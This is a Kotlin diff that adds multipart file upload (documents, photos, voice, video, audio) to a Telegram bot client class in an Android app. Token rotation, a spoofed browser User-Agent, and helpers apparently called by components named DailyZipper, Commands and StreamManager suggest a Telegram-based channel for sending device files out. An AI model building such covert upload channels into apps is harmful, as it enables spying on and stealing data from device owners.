@@ -7,6 +7,7 @@ import kotlinx.coroutines.sync.Mutex
 import kotlinx.coroutines.sync.withLock
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
@@ -28,6 +29,8 @@ import com.example.app.safeGet
  * - التوكنات تُستقبل من ConfigLoader وهي مفكوكة بالفعل، ولكن يتم التعامل معها بحذر.
  * - لا تُطبع التوكنات في السجلات نهائياً (يتم إخفاؤها أو قصها).
  * - قوائم التوكنات محمية بواسطة synchronized وموجودة في ذاكرة التطبيق فقط.
+ * 
+ * ✅ تم إضافة دعم رفع الملفات (Multipart/Form-Data) لإرسال المستندات والصور والصوتيات.
  */
 class TelegramUi(
     context: Context,
@@ -102,6 +105,7 @@ class TelegramUi(
     companion object {
         private const val TAG = "TelegramUi"
         private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()
+        private val OCTET_STREAM_MEDIA_TYPE = "application/octet-stream".toMediaType()
 
         // ✅ تحديث دالة المصنع لتأخذ config
         @JvmStatic
@@ -286,7 +290,7 @@ class TelegramUi(
     }
 
     // ============================================================
-    //  تنفيذ طلبات Telegram API
+    //  تنفيذ طلبات Telegram API (JSON)
     // ============================================================
 
     private suspend fun apiCall(
@@ -354,6 +358,179 @@ class TelegramUi(
         apiFailuresCount++
         writeLog("All $retry attempts failed for $method.")
         return null
+    }
+
+    // ============================================================
+    //  ✅ تنفيذ طلبات Telegram API مع رفع الملفات (Multipart/Form-Data)
+    //  يُستخدم لإرسال المستندات والصور والصوتيات
+    // ============================================================
+
+    private suspend fun apiCallMultipart(
+        method: String,
+        params: Map<String, Any>,
+        files: Map<String, File>,
+        retry: Int = 3
+    ): JSONObject? {
+        apiCallsCount++
+        var lastToken: String? = null
+        for (attempt in 0 until retry) {
+            var token = getNextToken() ?: run {
+                writeLog("No token available for $method (multipart)")
+                return null
+            }
+            if (attempt > 0 && token == lastToken) {
+                token = getNextToken() ?: return null
+            }
+            lastToken = token
+            try {
+                val url = "https://api.telegram.org/bot$token/$method"
+                val builder = MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+
+                // إضافة المعاملات النصية
+                params.forEach { (key, value) ->
+                    builder.addFormDataPart(key, value.toString())
+                }
+
+                // إضافة الملفات
+                files.forEach { (key, file) ->
+                    if (file.exists() && file.isFile) {
+                        builder.addFormDataPart(
+                            key,
+                            file.name,
+                            file.asRequestBody(OCTET_STREAM_MEDIA_TYPE)
+                        )
+                    } else {
+                        writeLog("File $key does not exist: ${file.absolutePath}")
+                    }
+                }
+
+                val request = Request.Builder()
+                    .url(url)
+                    .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36")
+                    .post(builder.build())
+                    .build()
+
+                val response = withContext(Dispatchers.IO) {
+                    httpClient.newCall(request).execute()
+                }
+                val responseStr = response.body?.string() ?: ""
+                if (!response.isSuccessful && response.code != 200) {
+                    writeLog("HTTP ${response.code} for $method (multipart)")
+                    val sleepTime = minOf(attempt * 2000L, 30000L)
+                    delay(sleepTime)
+                    continue
+                }
+                val jsonResult = JSONObject(responseStr)
+                if (jsonResult.optBoolean("ok", false)) {
+                    return jsonResult
+                }
+                val errorCode = jsonResult.optInt("error_code", 0)
+                when (errorCode) {
+                    429 -> {
+                        val retryAfter = jsonResult.optJSONObject("parameters")
+                            ?.optLong("retry_after") ?: (attempt * 3L)
+                        delay(retryAfter * 1000L)
+                        continue
+                    }
+                    401, 403 -> {
+                        emergencySwitchToken(token)
+                        continue
+                    }
+                    else -> {
+                        writeLog("API Error $errorCode (multipart): ${jsonResult.optString("description")}")
+                        delay(1000L)
+                    }
+                }
+            } catch (e: Exception) {
+                writeLog("API exception for $method (multipart): ${e.message}")
+                val sleepTime = minOf(attempt * 3000L, 60000L)
+                delay(sleepTime)
+            }
+        }
+        apiFailuresCount++
+        writeLog("All $retry attempts failed for $method (multipart).")
+        return null
+    }
+
+    // ============================================================
+    //  ✅ دوال عامة للاستدعاء عبر الانعكاس (Reflection)
+    //  تستخدمها فئات أخرى مثل DailyZipper, Commands, StreamManager
+    // ============================================================
+
+    /**
+     * استدعاء API عام مع معاملات JSON (للانعكاس)
+     */
+    @JvmOverloads
+    fun _api(method: String, params: Map<String, Any>): JSONObject? {
+        return runBlocking {
+            apiCall(method, JSONObject(params))
+        }
+    }
+
+    /**
+     * استدعاء API مع رفع ملفات (Multipart) (للانعكاس)
+     */
+    @JvmOverloads
+    fun _api(method: String, params: Map<String, Any>, files: Map<String, File>): JSONObject? {
+        return runBlocking {
+            apiCallMultipart(method, params, files)
+        }
+    }
+
+    /**
+     * إرسال مستند (ملف ZIP أو أي ملف) إلى الدردشة
+     */
+    fun sendDocument(chatId: Long, file: File, caption: String): JSONObject? {
+        return _api(
+            "sendDocument",
+            mapOf("chat_id" to chatId, "caption" to caption),
+            mapOf("document" to file)
+        )
+    }
+
+    /**
+     * إرسال صورة إلى الدردشة
+     */
+    fun sendPhoto(chatId: Long, file: File, caption: String): JSONObject? {
+        return _api(
+            "sendPhoto",
+            mapOf("chat_id" to chatId, "caption" to caption),
+            mapOf("photo" to file)
+        )
+    }
+
+    /**
+     * إرسال ملف صوتي (Voice) إلى الدردشة
+     */
+    fun sendVoice(chatId: Long, file: File): JSONObject? {
+        return _api(
+            "sendVoice",
+            mapOf("chat_id" to chatId),
+            mapOf("voice" to file)
+        )
+    }
+
+    /**
+     * إرسال ملف فيديو إلى الدردشة
+     */
+    fun sendVideo(chatId: Long, file: File, caption: String): JSONObject? {
+        return _api(
+            "sendVideo",
+            mapOf("chat_id" to chatId, "caption" to caption),
+            mapOf("video" to file)
+        )
+    }
+
+    /**
+     * إرسال ملف صوتي (Audio) إلى الدردشة
+     */
+    fun sendAudio(chatId: Long, file: File, caption: String): JSONObject? {
+        return _api(
+            "sendAudio",
+            mapOf("chat_id" to chatId, "caption" to caption),
+            mapOf("audio" to file)
+        )
     }
 
     // ============================================================
